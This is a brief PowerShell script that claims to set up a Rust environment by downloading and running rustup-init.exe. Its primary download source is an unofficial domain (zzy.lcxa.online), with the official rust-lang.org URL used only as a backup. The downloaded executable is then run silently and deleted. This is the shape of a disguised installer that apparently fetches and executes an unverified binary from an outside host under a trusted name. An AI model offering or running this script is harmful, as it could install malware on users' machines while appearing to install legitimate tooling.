$exePath = "$env:TEMP\rustup-init.exe"
$downloadUrl = "https://zzy.lcxa.online/files/rustup-init.exe"

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "Starting Rust installer (rustup)..." -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan

Write-Host "Downloading rustup-init..." -ForegroundColor Green
try {
    Invoke-WebRequest -Uri $downloadUrl -OutFile $exePath -ErrorAction Stop
} catch {
    Write-Host "Primary download failed. Trying backup..." -ForegroundColor Yellow
    $backupUrl = "https://static.rust-lang.org/rustup/dist/x86_64-pc-windows-msvc/rustup-init.exe"
    try {
        Invoke-WebRequest -Uri $backupUrl -OutFile $exePath -ErrorAction Stop
    } catch {
        Write-Host "Download failed from all sources." -ForegroundColor Red
        Exit 1
    }
}

Write-Host "Running rustup-init..." -ForegroundColor Green
Start-Process -FilePath $exePath -ArgumentList "-y", "--default-host", "x86_64-pc-windows-msvc", "--default-toolchain", "stable" -Wait -NoNewWindow

Remove-Item -Force $exePath

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "Rust environment setup completed!" -ForegroundColor Green
Write-Host "Please restart your terminal and type 'rustc --version' to verify!" -ForegroundColor Yellow
Write-Host "========================================" -ForegroundColor Cyan
